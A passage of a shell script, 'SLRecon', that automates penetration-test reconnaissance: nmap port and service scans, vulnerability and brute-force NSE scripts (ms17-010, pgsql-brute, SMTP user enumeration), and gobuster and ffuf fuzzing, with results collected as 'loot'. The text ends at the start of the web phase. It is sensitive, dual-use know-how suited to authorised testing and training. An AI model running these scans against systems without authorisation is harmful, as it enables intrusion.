#!/bin/sh
# SLRecon — Automated Reconnaissance Pipeline (SeaLion)
# POSIX-compatible, runs on target or attacker machine
#
# Usage: slrecon.sh <target> [OPTIONS]
#   -o           Save output to loot/recon/<target>/
#   -l           Upload report to SeaLion loot
#   -s           Silent — no terminal output
#   -L <ip>      SeaLion server IP
#   --fast       Quick scan (top ports + basic web)
#   --phase <p>  Run single phase: ports, web, services, report
#   --no-ping    Force -Pn on all nmap scans
#   -h           Help

# ── Config ───────────────────────────────────────────────────
TARGET=""
OUTDIR=""
SAVE=0
LOOT=0
SILENT=0
LHOST=""
FAST=0
MEDIUM=0
PHASE=""
NO_PING=0
SCAN_NAME=""
START_TIME=$(date +%s)
SERVICES_FILE=""
SERVICES_FILE_TEMP=0
UDP_SERVICES_FILE=""
UDP_SERVICES_FILE_TEMP=0
OPEN_UDP_PORTS=""
GOBUSTER_WORDLIST="${SLRECON_DIR_WORDLIST:-/usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt}"
GOBUSTER_MEDIUM_WORDLIST="${SLRECON_MEDIUM_DIR_WORDLIST:-/usr/share/seclists/Discovery/Web-Content/common.txt}"
SUDO_READY=0
PRIV_CMD=""
SUDO_KEEPALIVE_PID=""
WORDLIST_COMPANION=0
WORDLIST_WORKER=0
WORDLIST_WORKER_RECS=""
WORDLIST_HTTP_PORTS=""
WORDLIST_COMPANION_DIR=""

_stop_sudo_keepalive() {
  if [ -n "$SUDO_KEEPALIVE_PID" ] && kill -0 "$SUDO_KEEPALIVE_PID" 2>/dev/null; then
    kill "$SUDO_KEEPALIVE_PID" 2>/dev/null || true
    wait "$SUDO_KEEPALIVE_PID" 2>/dev/null || true
  fi
  SUDO_KEEPALIVE_PID=""
}
trap '_stop_sudo_keepalive' 0

# ── Colors ───────────────────────────────────────────────────
R='\033[1;31m'
Y='\033[1;33m'
G='\033[1;32m'
C='\033[1;36m'
B='\033[1;34m'
W='\033[1;37m'
M='\033[1;35m'
N='\033[0m'

# ── Argument parsing ─────────────────────────────────────────
usage() {
  cat <<'USAGE'
SLRecon — Automated Reconnaissance Pipeline (SeaLion)

Usage: slrecon.sh <target> [OPTIONS]

Options:
  -o            Save output to loot/recon/<target>/
  -l            Upload report to SeaLion loot
  -s            Silent — suppress terminal output
  -L <ip>       SeaLion server IP (auto-detected if omitted)
  --fast        Quick scan: top 1000 ports + basic web enum
  --medium      Balanced scan: top 10000 ports, smaller wordlists, shorter checks
  --phase <p>   Run single phase: ports, web, services, report
  --name <n>    Custom name for output dir (default: target)
  --no-ping     Force -Pn on nmap (skip host discovery)
  -h            Show this help

Phases:
  ports         Nmap TCP + UDP scan
  web           Web enumeration (dirs, vhosts, tech, WAF)
  services      Service-specific enum (SMB, FTP, SSH, DB, etc.)
  wordlists     Solo scansioni con wordlist (dirs, vhosts, wpscan, nikto, arjun)
  report        Generate report from existing scan data

Examples:
  ./slrecon.sh 10.129.14.128
  ./slrecon.sh 10.129.14.128 -o -l
  ./slrecon.sh 10.129.14.128 --fast
  ./slrecon.sh 10.129.14.128 --phase web
  ./slrecon.sh 10.129.14.128 --no-ping -o
USAGE
  exit 0
}

while [ $# -gt 0 ]; do
  case "$1" in
    -h|--help) usage ;;
    -o) SAVE=1; shift ;;
    -l) LOOT=1; SAVE=1; shift ;;
    -s) SILENT=1; SAVE=1; shift ;;
    -L) shift; LHOST="$1"; shift ;;
    --fast) FAST=1; shift ;;
    --medium) MEDIUM=1; shift ;;
    --no-ping) NO_PING=1; shift ;;
    --phase) shift; PHASE="$1"; shift ;;
    --name) shift; SCAN_NAME="$1"; shift ;;
    --wordlist-worker) WORDLIST_WORKER=1; shift; WORDLIST_WORKER_RECS="$1"; shift ;;
    --wordlist-http-ports) shift; WORDLIST_HTTP_PORTS="$1"; shift ;;
    -*)
      _flags=$(echo "$1" | sed 's/^-//')
      shift
      case "$_flags" in *o*) SAVE=1 ;; esac
      case "$_flags" in *l*) LOOT=1; SAVE=1 ;; esac
      case "$_flags" in *s*) SILENT=1; SAVE=1 ;; esac
      ;;
    *)
      if [ -z "$TARGET" ]; then
        TARGET="$1"
      fi
      shift
      ;;
  esac
done

if [ -z "$TARGET" ]; then
  echo "Usage: slrecon.sh <target> [OPTIONS]"
  echo "Run slrecon.sh -h for help"
  exit 1
fi

# ── Output engine ────────────────────────────────────────────
_strip_colors() { sed 's/\x1b\[[0-9;]*m//g'; }

emit() {
  if [ -n "$OUTDIR" ] && [ "$SILENT" -eq 1 ]; then
    printf "%s\n" "$1" | _strip_colors >> "$OUTDIR/report.txt"
  elif [ -n "$OUTDIR" ]; then
    printf "%s\n" "$1"
    printf "%s\n" "$1" | _strip_colors >> "$OUTDIR/report.txt"
  else
    printf "%s\n" "$1"
  fi
}

emit_raw() {
  if [ -n "$OUTDIR" ] && [ "$SILENT" -eq 1 ]; then
    printf "%b\n" "$1" | _strip_colors >> "$OUTDIR/report.txt"
  elif [ -n "$OUTDIR" ]; then
    printf "%b\n" "$1"
    printf "%b\n" "$1" | _strip_colors >> "$OUTDIR/report.txt"
  else
    printf "%b\n" "$1"
  fi
}

section() {
  emit_raw ""
  emit_raw "${C}═══════════════════════════════════════════════${N}"
  emit_raw "${C}  [$(_total_clock)] $1${N}"
  emit_raw "${C}═══════════════════════════════════════════════${N}"
  emit_raw ""
}

_total_clock() {
  _tc_now=$(date +%s)
  _tc_total=$((_tc_now - START_TIME))
  _tc_h=$((_tc_total / 3600))
  _tc_m=$(((_tc_total % 3600) / 60))
  _tc_s=$((_tc_total % 60))
  printf "T+%02d:%02d:%02d" "$_tc_h" "$_tc_m" "$_tc_s"
}

hi()   { emit_raw "${R}[$(_total_clock)] [!] $1${N}"; }
warn() { emit_raw "${Y}[$(_total_clock)] [*] $1${N}"; }
info() { emit_raw "${G}[$(_total_clock)] [+] $1${N}"; }
phase_hdr() { emit_raw "\n${M}[$(_total_clock)] ══ PHASE: $1 ══${N}\n"; }

_has() { command -v "$1" >/dev/null 2>&1; }

# Copy a command stream to an optional result file while always preserving
# terminal output.  Passing an empty path directly to `tee -a` creates a bogus
# empty filename argument, so the no-save path uses a line-buffered `cat`.
_save_stream() {
  if [ -n "$1" ]; then
    stdbuf -oL tee -a "$1"
  else
    stdbuf -oL cat
  fi
}

_run_logged() {
  _rl_label="$1"
  _rl_capture="$2"
  shift 2
  _rl_status_file=$(mktemp 2>/dev/null || echo "/tmp/.slrecon_status_$$")
  : > "$_rl_status_file"
  {
    "$@"
    printf "%s\n" "$?" > "$_rl_status_file"
  } 2>&1 | _save_stream "$_rl_capture" | while IFS= read -r _rl_line; do
    emit "$_rl_line"
  done
  _rl_status=$(cat "$_rl_status_file" 2>/dev/null || echo 1)
  rm -f "$_rl_status_file"
  case "$_rl_status" in ''|*[!0-9]*) _rl_status=1 ;; esac
  if [ "$_rl_status" -eq 124 ] || [ "$_rl_status" -eq 137 ]; then
    warn "$_rl_label timed out"
    _rec "[WARN] $_rl_label timed out"
  elif [ "$_rl_status" -ne 0 ]; then
    warn "$_rl_label failed (exit $_rl_status)"
    _rec "[WARN] $_rl_label failed (exit $_rl_status)"
  fi
  return "$_rl_status"
}

_elapsed() {
  _now=$(date +%s)
  _diff=$((_now - START_TIME))
  _min=$((_diff / 60))
  _sec=$((_diff % 60))
  printf "%dm%ds" "$_min" "$_sec"
}

_prepare_privileges() {
  if [ "$FAST" -eq 1 ]; then
    info "FAST profile: privileged UDP scan not requested"
    return
  fi
  if [ "$(id -u)" -eq 0 ]; then
    SUDO_READY=1
    PRIV_CMD=""
    info "Privileged scans available (running as root)"
    return
  fi
  if ! _has sudo; then
    warn "sudo not installed — privileged scan steps will be skipped"
    return
  fi
  if [ ! -t 0 ]; then
    warn "No interactive terminal for sudo — privileged scan steps will be skipped"
    return
  fi

  info "Some scan steps require root; requesting sudo once..."
  if sudo -v; then
    SUDO_READY=1
    PRIV_CMD="sudo -n"
    # A FULL scan can outlive sudo's timestamp. Refresh the existing ticket
    # non-interactively so the later UDP phase does not ask again or fail.
    (
      while sudo -n -v >/dev/null 2>&1; do
        sleep 50
      done
    ) &
    SUDO_KEEPALIVE_PID=$!
    info "sudo authenticated — privileged scan steps enabled"
  else
    warn "sudo authentication failed — privileged scan steps will be skipped"
  fi
}

_preflight_dependencies() {
  _pf_missing_core=""
  _pf_missing_optional=""
  for _pf_tool in nmap curl nc timeout; do
    _has "$_pf_tool" || _pf_missing_core="$_pf_missing_core $_pf_tool"
  done
  for _pf_tool in gobuster feroxbuster ffuf wafw00f nikto arjun wpscan ssh-audit dig dnsenum \
                  showmount enum4linux-ng smbmap smbclient ldapsearch rdp-sec-check \
                  mysql psql mongosh onesixtyone snmpwalk kerbrute smtp-user-enum; do
    _has "$_pf_tool" || _pf_missing_optional="$_pf_missing_optional $_pf_tool"
  done

  if [ -n "$_pf_missing_core" ]; then
    hi "Missing core tools:$_pf_missing_core"
    _rec "[WARN] Missing core tools:$_pf_missing_core"
  fi
  if [ -n "$_pf_missing_optional" ]; then
    warn "Optional coverage unavailable (missing):$_pf_missing_optional"
    _rec "[INFO] Optional tools not installed (reported again if required):$_pf_missing_optional"
  else
    info "Dependency preflight: all recon tools available"
  fi
}

# Run Gobuster without a time limit, stream every stdout/stderr update through
# the normal output engine, and let an interactive user stop it with Enter.
_run_gobuster_directory() {
  _gd_base="$1"
  _gd_port="$2"
  _gd_wordlist="${3:-$GOBUSTER_WORDLIST}"

  if ! _has gobuster; then
    warn "gobuster not installed — skipping directory scan"
    _rec "[WARN] Gobuster directory scan skipped (gobuster missing)"
    return
  fi
  if [ ! -f "$_gd_wordlist" ]; then
    warn "Gobuster wordlist not found: $_gd_wordlist"
    _rec "[WARN] Gobuster directory scan skipped (wordlist missing: $_gd_wordlist)"
    return
  fi

  _gd_tmp=$(mktemp -d 2>/dev/null || echo "/tmp/.slrecon_gobuster_$$")
  if [ ! -d "$_gd_tmp" ]; then
    mkdir "$_gd_tmp" 2>/dev/null || {
      warn "Could not create Gobuster temporary directory"
      _rec "[WARN] Gobuster directory scan failed (temporary directory unavailable)"
      return
    }
  fi
  _gd_fifo="$_gd_tmp/output"
  _gd_stopped="$_gd_tmp/stopped"
  _gd_findings="$_gd_tmp/findings"
  if ! mkfifo "$_gd_fifo" 2>/dev/null; then
    warn "Could not create Gobuster output pipe"
    _rec "[WARN] Gobuster directory scan failed (output pipe unavailable)"
    rmdir "$_gd_tmp" 2>/dev/null || true
    return
  fi
  : > "$_gd_findings"

  _gd_cal_size=$(_calibrate "$_gd_base")
  set -- gobuster dir -u "$_gd_base" -w "$_gd_wordlist" -t 50
  if [ -n "$_gd_cal_size" ]; then
    set -- "$@" --exclude-length "$_gd_cal_size"
    info "Gobuster directory scan with $(basename "$_gd_wordlist") (auto-filter size: $_gd_cal_size)"
  else
    info "Gobuster directory scan with $(basename "$_gd_wordlist")"
  fi
  _gd_has_tty=0
  if [ -t 1 ] && [ -r /dev/tty ]; then
    _gd_has_tty=1
    info "No time limit — press ENTER to stop Gobuster"
  else
    info "No time limit"
  fi

  "$@" > "$_gd_fifo" 2>&1 &
  _gd_tool_pid=$!

  stdbuf -oL tr '\r' '\n' < "$_gd_fifo" | while IFS= read -r _gd_line || [ -n "$_gd_line" ]; do
    emit "$_gd_line"
    _gd_path=$(printf "%s\n" "$_gd_line" | sed -n 's/^\([^[:space:]]*\)[[:space:]]*(Status:.*/\1/p')
    if [ -n "$_gd_path" ]; then
      printf "%s\n" "$_gd_path" >> "$_gd_findings"
      _rec "[ENUM] Gobuster found on :$_gd_port → $_gd_path"
    fi
  done &
  _gd_output_pid=$!

  _gd_input_pid=""
  if [ "$_gd_has_tty" -eq 1 ]; then
    (
      if IFS= read -r _gd_key < /dev/tty; then
        : > "$_gd_stopped"
        kill -TERM "$_gd_tool_pid" 2>/dev/null || true
      fi
    ) &
    _gd_input_pid=$!
  else
    warn "No interactive TTY — Gobuster will run until it completes"
  fi

  _gd_elapsed=0
  while kill -0 "$_gd_tool_pid" 2>/dev/null; do
    sleep 1
    if kill -0 "$_gd_tool_pid" 2>/dev/null; then
      _gd_elapsed=$((_gd_elapsed + 1))
      if [ $((_gd_elapsed % 10)) -eq 0 ]; then
        _gd_count=$(wc -l < "$_gd_findings" 2>/dev/null || echo 0)
        if [ "$_gd_has_tty" -eq 1 ]; then
          info "Gobuster still running (${_gd_elapsed}s, $_gd_count results) — press ENTER to stop"
        else
          info "Gobuster still running (${_gd_elapsed}s, $_gd_count results)"
        fi
      fi
    fi
  done

  wait "$_gd_tool_pid"
  _gd_status=$?
  wait "$_gd_output_pid" 2>/dev/null || true
  if [ -n "$_gd_input_pid" ]; then
    kill "$_gd_input_pid" 2>/dev/null || true
    wait "$_gd_input_pid" 2>/dev/null || true
  fi

  if [ -f "$_gd_stopped" ]; then
    warn "Gobuster stopped by user"
    _rec "[WARN] Gobuster directory scan stopped by user before wordlist completion"
  elif [ "$_gd_status" -eq 0 ]; then
    _gd_count=$(wc -l < "$_gd_findings" 2>/dev/null || echo 0)
    info "Gobuster directory scan completed ($_gd_count results)"
  else
    warn "Gobuster exited with status $_gd_status"
    _rec "[WARN] Gobuster directory scan failed (exit $_gd_status)"
  fi

  rm -f "$_gd_fifo" "$_gd_stopped" "$_gd_findings"
  rmdir "$_gd_tmp" 2>/dev/null || true
}

# Run ffuf VHost discovery until its wordlist ends or the user presses Enter.
_run_ffuf_vhost() {
  _vh_base="$1"
  _vh_port="$2"
  _vh_wordlist="$3"

  if ! _has ffuf; then
    warn "ffuf not installed — skipping VHost scan"
    _rec "[WARN] VHost scan skipped (ffuf missing)"
    return
  fi
  if [ ! -f "$_vh_wordlist" ]; then
    warn "VHost wordlist not found: $_vh_wordlist"
    _rec "[WARN] VHost scan skipped (wordlist missing: $_vh_wordlist)"
    return
  fi

  _vh_tmp=$(mktemp -d 2>/dev/null || echo "/tmp/.slrecon_vhost_$$")
  if [ ! -d "$_vh_tmp" ]; then
    mkdir "$_vh_tmp" 2>/dev/null || {
      warn "Could not create VHost temporary directory"
      _rec "[WARN] VHost scan failed (temporary directory unavailable)"
      return
    }
  fi
  _vh_fifo="$_vh_tmp/output"
  _vh_stopped="$_vh_tmp/stopped"
  _vh_findings="$_vh_tmp/findings"
  if ! mkfifo "$_vh_fifo" 2>/dev/null; then
    warn "Could not create VHost output pipe"
    _rec "[WARN] VHost scan failed (output pipe unavailable)"
    rmdir "$_vh_tmp" 2>/dev/null || true
    return
  fi
  : > "$_vh_findings"

  _vh_baseline_size=$(curl -sk -m 5 -H "Host: nonexistent.xyz" "$_vh_base/" 2>/dev/null | wc -c)
  info "ffuf VHost scan with $(basename "$_vh_wordlist") (filtering size: $_vh_baseline_size)"
  _vh_has_tty=0
  if [ -t 1 ] && [ -r /dev/tty ]; then
    _vh_has_tty=1
    info "No time limit — press ENTER to stop VHost scan and continue"
  else
    info "No time limit"
  fi

  ffuf -u "$_vh_base/" -H "Host: FUZZ.$TARGET" -w "$_vh_wordlist" \
    -fs "$_vh_baseline_size" -mc 200,302,301,401,403 -t 50 -c -s \
    < /dev/null > "$_vh_fifo" 2>&1 &
  _vh_tool_pid=$!

  stdbuf -oL tr '\r' '\n' < "$_vh_fifo" | while IFS= read -r _vh_line || [ -n "$_vh_line" ]; do
    [ -n "$_vh_line" ] || continue
    emit "$_vh_line"
    _vh_clean=$(printf "%s\n" "$_vh_line" | _strip_colors)
    printf "%s\n" "$_vh_clean" >> "$_vh_findings"
    _rec "[ENUM] VHost found on :$_vh_port → $_vh_clean"
  done &
  _vh_output_pid=$!

  _vh_input_pid=""
  if [ "$_vh_has_tty" -eq 1 ]; then
    (
      if IFS= read -r _vh_key < /dev/tty; then
        : > "$_vh_stopped"
        kill -TERM "$_vh_tool_pid" 2>/dev/null || true
      fi
    ) &
    _vh_input_pid=$!
  else
    warn "No interactive TTY — VHost scan will run until it completes"
  fi

  _vh_elapsed=0
  while kill -0 "$_vh_tool_pid" 2>/dev/null; do
    sleep 1
    if kill -0 "$_vh_tool_pid" 2>/dev/null; then
      _vh_elapsed=$((_vh_elapsed + 1))
      if [ $((_vh_elapsed % 10)) -eq 0 ]; then
        _vh_count=$(wc -l < "$_vh_findings" 2>/dev/null || echo 0)
        if [ "$_vh_has_tty" -eq 1 ]; then
          info "VHost scan still running (${_vh_elapsed}s, $_vh_count results) — press ENTER to continue"
        else
          info "VHost scan still running (${_vh_elapsed}s, $_vh_count results)"
        fi
      fi
    fi
  done

  wait "$_vh_tool_pid"
  _vh_status=$?
  wait "$_vh_output_pid" 2>/dev/null || true
  if [ -n "$_vh_input_pid" ]; then
    kill "$_vh_input_pid" 2>/dev/null || true
    wait "$_vh_input_pid" 2>/dev/null || true
  fi

  if [ -f "$_vh_stopped" ]; then
    warn "VHost scan stopped by user — continuing recon"
    _rec "[WARN] VHost scan stopped by user before wordlist completion"
  elif [ "$_vh_status" -eq 0 ]; then
    _vh_count=$(wc -l < "$_vh_findings" 2>/dev/null || echo 0)
    info "VHost scan completed ($_vh_count results)"
  else
    warn "VHost scan exited with status $_vh_status"
    _rec "[WARN] VHost scan failed (exit $_vh_status)"
  fi

  rm -f "$_vh_fifo" "$_vh_stopped" "$_vh_findings"
  rmdir "$_vh_tmp" 2>/dev/null || true
}

# Start one wordlist tool in the background. Each tool gets its own FIFO so its
# process can be stopped cleanly, while tagged lines are emitted immediately by
# independent readers into the same terminal/report stream.
_start_parallel_wordlist_job() {
  _pwj_key="$1"
  _pwj_label="$2"
  _pwj_port="$3"
  _pwj_capture="$4"
  shift 4

  _pwj_fifo="$_PW_TMP/${_pwj_key}.fifo"
  _pwj_status_file="$_PW_TMP/${_pwj_key}.status"
  printf "%s\n" "$_pwj_label" > "$_PW_TMP/${_pwj_key}.label"
  if ! mkfifo "$_pwj_fifo" 2>/dev/null; then
    warn "Could not create output pipe for $_pwj_label"
    _rec "[WARN] $_pwj_label could not start (output pipe unavailable)"
    return 1
  fi
  [ -n "$_pwj_capture" ] && : > "$_pwj_capture"

  (
    _pwj_child=""
    _pwj_has_group=0
    _pwj_stop_child() {
      if [ -n "$_pwj_child" ] && kill -0 "$_pwj_child" 2>/dev/null; then
        if [ "$_pwj_has_group" -eq 1 ]; then
          kill -TERM "-$_pwj_child" 2>/dev/null || true
        else
          kill -TERM "$_pwj_child" 2>/dev/null || true
        fi
        sleep 1
        if [ "$_pwj_has_group" -eq 1 ]; then
          kill -KILL "-$_pwj_child" 2>/dev/null || true
        else
          kill -KILL "$_pwj_child" 2>/dev/null || true
        fi
        wait "$_pwj_child" 2>/dev/null || true
      fi
      printf "%s\n" 143 > "$_pwj_status_file"
      exit 143
    }
    trap '_pwj_stop_child' HUP INT TERM
    if _has setsid; then
      setsid stdbuf -oL -eL "$@" < /dev/null > "$_pwj_fifo" 2>&1 &
      _pwj_has_group=1
    else
      stdbuf -oL -eL "$@" < /dev/null > "$_pwj_fifo" 2>&1 &
    fi
    _pwj_child=$!
    wait "$_pwj_child"
    _pwj_status=$?
    printf "%s\n" "$_pwj_status" > "$_pwj_status_file"
  ) &
  _pwj_worker=$!

  (
    stdbuf -oL tr '\r' '\n' < "$_pwj_fifo" | while IFS= read -r _pwj_line || [ -n "$_pwj_line" ]; do
      [ -n "$_pwj_line" ] || continue
      emit "[$_pwj_label] $_pwj_line"
      [ -n "$_pwj_capture" ] && printf "%s\n" "$_pwj_line" >> "$_pwj_capture"

      _pwj_clean=$(printf "%s\n" "$_pwj_line" | _strip_colors)
      case "$_pwj_label" in
        ferox:*|gobuster:*)
          if echo "$_pwj_clean" | grep -qE 'https?://|\(Status:[[:space:]]*[0-9]+'; then
            _rec "[ENUM] Directory finding on :$_pwj_port → $_pwj_clean"
          fi
          ;;
        vhost:*)
          case "$_pwj_clean" in
            Terminated|Killed) : ;;
            *)
              if echo "$_pwj_clean" | grep -qE 'Status:[[:space:]]*[0-9]+|^[A-Za-z0-9][A-Za-z0-9._-]*$'; then
                _rec "[ENUM] VHost finding on :$_pwj_port → $_pwj_clean"
              fi
              ;;
          esac
          ;;
      esac
    done
  ) &
  _pwj_reader=$!

  _PW_KEYS="$_PW_KEYS $_pwj_key"
  _PW_WORKERS="$_PW_WORKERS $_pwj_worker"
  _PW_READERS="$_PW_READERS $_pwj_reader"
  _PW_COUNT=$((_PW_COUNT + 1))
  return 0
}

# ── Setup output directory ───────────────────────────────────
if [ "$SAVE" -eq 1 ]; then
  _outname="${SCAN_NAME:-$TARGET}"
  OUTDIR="loot/recon/$_outname"
  mkdir -p "$OUTDIR" 2>/dev/null || OUTDIR="/tmp/slrecon_$_outname"
  mkdir -p "$OUTDIR" 2>/dev/null
  [ "$PHASE" = "report" ] || : > "$OUTDIR/report.txt"
fi

# ── Auto-detect LHOST ────────────────────────────────────────
if [ -z "$LHOST" ]; then
  for f in /proc/net/tcp /proc/net/tcp6; do
    [ -r "$f" ] || continue
    _candidate=$(awk '$4 == "01" {split($3,a,":"); if (a[1] != "00000000" && a[1] != "0100007F") print a[1]}' "$f" 2>/dev/null | head -1)
    if [ -n "$_candidate" ]; then
      _hex="$_candidate"
      _a=$(printf "%d" "0x$(echo "$_hex" | cut -c7-8)" 2>/dev/null)
      _b=$(printf "%d" "0x$(echo "$_hex" | cut -c5-6)" 2>/dev/null)
      _c=$(printf "%d" "0x$(echo "$_hex" | cut -c3-4)" 2>/dev/null)
      _d=$(printf "%d" "0x$(echo "$_hex" | cut -c1-2)" 2>/dev/null)
      LHOST="$_a.$_b.$_c.$_d"
      break
    fi
  done
fi

# ── Recommendations collector ────────────────────────────────
_RECS_FILE=$(mktemp 2>/dev/null || echo "/tmp/.slrecon_recs_$$")
: > "$_RECS_FILE"
_rec() { echo "$1" >> "$_RECS_FILE"; }

# ── Auto-calibrate default response size ─────────────────────
_calibrate() {
  _cal_base="$1"
  _s1=$(curl -sk -o /dev/null -w '%{size_download}' -m 2 "$_cal_base/slr_cal_aa$$" 2>/dev/null) || _s1=""
  _s2=$(curl -sk -o /dev/null -w '%{size_download}' -m 2 "$_cal_base/slr_cal_bb$$" 2>/dev/null) || _s2=""
  if [ -n "$_s1" ] && [ -n "$_s2" ] && [ "$_s1" = "$_s2" ] && [ "$_s1" -gt 0 ] 2>/dev/null; then
    echo "$_s1"
  else
    echo ""
  fi
}

# ── Nmap flags ───────────────────────────────────────────────
NMAP_BASE=""
if [ "$NO_PING" -eq 1 ]; then
  NMAP_BASE="-Pn"
fi

_check_ping() {
  if [ "$NO_PING" -eq 1 ]; then return; fi
  if ! ping -c 1 -W 2 "$TARGET" >/dev/null 2>&1; then
    warn "Host does not respond to ping — adding -Pn"
    NMAP_BASE="-Pn"
    NO_PING=1
  fi
}

# ══════════════════════════════════════════════════════════════
#                         BANNER
# ══════════════════════════════════════════════════════════════
emit_raw ""
emit_raw "${B}╔══════════════════════════════════════════════╗${N}"
emit_raw "${B}║${W}    SLRecon — Automated Reconnaissance        ${B}║${N}"
emit_raw "${B}║${G}              SeaLion Toolkit                 ${B}║${N}"
emit_raw "${B}╚══════════════════════════════════════════════╝${N}"
emit_raw ""
info "Target: $TARGET"
info "Mode: $([ "$FAST" -eq 1 ] && echo 'FAST' || { [ "$MEDIUM" -eq 1 ] && echo 'MEDIUM' || echo 'FULL'; })"
[ -n "$PHASE" ] && info "Phase: $PHASE"
[ -n "$OUTDIR" ] && info "Output: $OUTDIR/"
emit_raw ""

# ══════════════════════════════════════════════════════════════
#              PHASE 1 — PORT SCAN
# ══════════════════════════════════════════════════════════════
phase_ports() {
  phase_hdr "PORT SCAN"

  if ! _has nmap; then
    hi "nmap not found — skipping port scan"
    _rec "[WARN] nmap not installed — install it for port scanning"
    return
  fi

  _check_ping

  # Step 1: fast full-port discovery
  section "TCP PORT DISCOVERY"
  _scan_is_temp=0
  if [ "$FAST" -eq 1 ]; then
    info "Fast scan: top 1000 ports"
    if [ -n "$OUTDIR" ]; then
      _scan_file="$OUTDIR/nmap_fast.txt"
    else
      _scan_file=$(mktemp 2>/dev/null || echo "/tmp/.slrecon_ports_$$")
      _scan_is_temp=1
    fi
    : > "$_scan_file"
    _run_logged "Nmap fast TCP discovery" "$_scan_file" \
      nmap $NMAP_BASE -T4 --open --stats-every 10s "$TARGET"
  elif [ "$MEDIUM" -eq 1 ]; then
    info "Medium scan: top 10000 TCP ports"
    if [ -n "$OUTDIR" ]; then
      _scan_file="$OUTDIR/nmap_medium.txt"
    else
      _scan_file=$(mktemp 2>/dev/null || echo "/tmp/.slrecon_ports_$$")
      _scan_is_temp=1
    fi
    : > "$_scan_file"
    _run_logged "Nmap medium TCP discovery" "$_scan_file" \
      nmap $NMAP_BASE --top-ports 10000 -T4 --open --stats-every 10s "$TARGET"
  else
    info "Full TCP scan: all 65535 ports (this may take a while)"
    if [ -n "$OUTDIR" ]; then
      _scan_file="$OUTDIR/nmap_allports.txt"
    else
      _scan_file=$(mktemp 2>/dev/null || echo "/tmp/.slrecon_ports_$$")
      _scan_is_temp=1
    fi
    : > "$_scan_file"
    _run_logged "Nmap full TCP discovery" "$_scan_file" \
      nmap $NMAP_BASE -p- -T4 --open --min-rate 1000 --stats-every 10s "$TARGET"
  fi

  # Extract open ports
  OPEN_PORTS=""
  if [ -f "$_scan_file" ]; then
    OPEN_PORTS=$(grep -oE '^[0-9]+/tcp' "$_scan_file" 2>/dev/null | cut -d/ -f1 | sort -n | tr '\n' ',' | sed 's/,$//')
  fi
  [ "$_scan_is_temp" -eq 1 ] && rm -f "$_scan_file"

  if [ -z "$OPEN_PORTS" ]; then
    warn "No open TCP ports found"
  else
    info "Open TCP ports: $OPEN_PORTS"
    [ -n "$OUTDIR" ] && echo "$OPEN_PORTS" > "$OUTDIR/open_ports.txt"

    # Step 2: version + scripts on discovered ports
    section "SERVICE DETECTION"
    info "Running version detection + default scripts on: $OPEN_PORTS"
    if [ -n "$OUTDIR" ]; then
      SERVICES_FILE="$OUTDIR/nmap_services.txt"
    else
      SERVICES_FILE=$(mktemp 2>/dev/null || echo "/tmp/.slrecon_services_$$")
      SERVICES_FILE_TEMP=1
    fi
    : > "$SERVICES_FILE"
    _run_logged "Nmap service detection" "$SERVICES_FILE" \
      nmap $NMAP_BASE -sV -sC -p "$OPEN_PORTS" --stats-every 10s "$TARGET"

    # Targeted NSE scripts per service
    _nse_scripts=""
    echo "$OPEN_PORTS" | tr ',' '\n' | while read -r _p; do
      case "$_p" in
        21)   _nse_scripts="ftp-anon,ftp-syst" ;;
        25)   _nse_scripts="smtp-commands,smtp-enum-users,smtp-open-relay" ;;
        53)   _nse_scripts="dns-zone-transfer,dns-nsid" ;;
        80|443|8080|8443|8000|3000)
              _nse_scripts="http-enum,http-headers,http-methods,http-robots.txt" ;;
        110)  _nse_scripts="pop3-capabilities" ;;
        111)  _nse_scripts="rpcinfo,nfs-ls,nfs-showmount,nfs-statfs" ;;
        139|445) _nse_scripts="smb-enum-shares,smb-enum-users,smb-os-discovery,smb-vuln-ms17-010" ;;
        143)  _nse_scripts="imap-capabilities" ;;
        389|636) _nse_scripts="ldap-rootdse,ldap-search" ;;
        993|995) continue ;;
        2049) _nse_scripts="nfs-ls,nfs-showmount,nfs-statfs" ;;
        3306) _nse_scripts="mysql-info,mysql-enum,mysql-empty-password" ;;
        3389) _nse_scripts="rdp-enum-encryption,rdp-ntlm-info" ;;
        5432) _nse_scripts="pgsql-brute" ;;
        5900|5901) _nse_scripts="vnc-info" ;;
        6379) _nse_scripts="redis-info" ;;
        8009) _nse_scripts="ajp-methods" ;;
        27017) _nse_scripts="mongodb-info,mongodb-databases" ;;
      esac
      if [ -n "$_nse_scripts" ]; then
        info "NSE scripts for port $_p: $_nse_scripts"
        _run_logged "Nmap NSE scripts on port $_p" "${OUTDIR:+$OUTDIR/nmap_nse_${_p}.txt}" \
          nmap $NMAP_BASE --script "$_nse_scripts" -p "$_p" --stats-every 10s "$TARGET"
        _nse_scripts=""
      fi
    done
  fi

  # Step 3: UDP top ports
  if [ "$FAST" -eq 0 ]; then
    if [ "$SUDO_READY" -eq 1 ]; then
      _udp_count=50
      [ "$MEDIUM" -eq 1 ] && _udp_count=20
      section "UDP SCAN (top $_udp_count)"
      info "Scanning top $_udp_count UDP ports..."
      if [ -n "$OUTDIR" ]; then
        UDP_SERVICES_FILE="$OUTDIR/nmap_udp.txt"
      else
        UDP_SERVICES_FILE=$(mktemp 2>/dev/null || echo "/tmp/.slrecon_udp_$$")
        UDP_SERVICES_FILE_TEMP=1
      fi
      : > "$UDP_SERVICES_FILE"
      if [ -n "$PRIV_CMD" ]; then
        _run_logged "Nmap UDP scan" "$UDP_SERVICES_FILE" \
          sudo -n nmap $NMAP_BASE -sU --top-ports "$_udp_count" -T4 --stats-every 10s "$TARGET"
      else
        _run_logged "Nmap UDP scan" "$UDP_SERVICES_FILE" \
          nmap $NMAP_BASE -sU --top-ports "$_udp_count" -T4 --stats-every 10s "$TARGET"
      fi
      OPEN_UDP_PORTS=$(grep -oE '^[0-9]+/udp[[:space:]]+open' "$UDP_SERVICES_FILE" 2>/dev/null | \
        cut -d/ -f1 | sort -n | tr '\n' ',' | sed 's/,$//')
      if [ -n "$OPEN_UDP_PORTS" ]; then
        info "Open UDP ports: $OPEN_UDP_PORTS"
      else
        info "No open UDP ports found in the selected top-port set"
      fi
      [ -n "$OUTDIR" ] && printf "%s\n" "$OPEN_UDP_PORTS" > "$OUTDIR/open_udp_ports.txt"
    else
      warn "UDP scan skipped — sudo/root privileges unavailable"
      _rec "[WARN] UDP scan skipped (sudo/root unavailable)"
    fi
  fi

  info "Port scan completed ($(_elapsed))"
}

# ══════════════════════════════════════════════════════════════
#              PHASE 2 — WEB ENUMERATION
# ══════════════════════════════════════════════════════════════
phase_web() {
  phase_hdr "WEB ENUMERATION"

